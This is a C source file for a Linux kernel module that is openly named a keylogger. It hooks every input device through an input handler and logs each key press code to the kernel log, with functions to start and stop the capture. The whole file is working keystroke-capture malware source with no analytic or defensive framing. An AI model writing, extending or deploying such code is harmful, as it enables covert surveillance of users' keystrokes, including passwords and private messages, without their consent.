#include "keylogger.h"
#include <linux/module.h>
#include <linux/input.h>
#include <linux/slab.h>
#include <linux/kthread.h>
#include <linux/delay.h>

static struct input_handler keylogger_handler;
static struct task_struct *keylogger_task;
static int running;

static int key_event(struct input_handle *handle, unsigned int type, unsigned int code, int value) {
    if (type == EV_KEY && value == 1)
        printk(KERN_INFO "KPRZ_KEYLOGGER: Keycode %u pressed\n", code);
    return 0;
}

static int keylogger_connect(struct input_handler *handler, struct input_dev *dev, const struct input_device_id *id) {
    struct input_handle *handle;
    handle = kzalloc(sizeof(struct input_handle), GFP_KERNEL);
    if (!handle)
        return -ENOMEM;

    handle->dev = dev;
    handle->handler = handler;
    handle->name = "kprz_keylogger";

    return input_register_handle(handle) ? : input_open_device(handle);
}

static void keylogger_disconnect(struct input_handle *handle) {
    input_close_device(handle);
    input_unregister_handle(handle);
    kfree(handle);
}

static const struct input_device_id keylogger_ids[] = {
    { .driver_info = 1 },
    { },
};

static struct input_handler keylogger_handler = {
    .event = key_event,
    .connect = keylogger_connect,
    .disconnect = keylogger_disconnect,
    .name = "kprz_keylogger",
    .id_table = keylogger_ids,
};

void start_keylogger(void) {
    if (!running) {
        input_register_handler(&keylogger_handler);
        running = 1;
    }
}

void stop_keylogger(void) {
    if (running) {
        input_unregister_handler(&keylogger_handler);
        running = 0;
    }
}
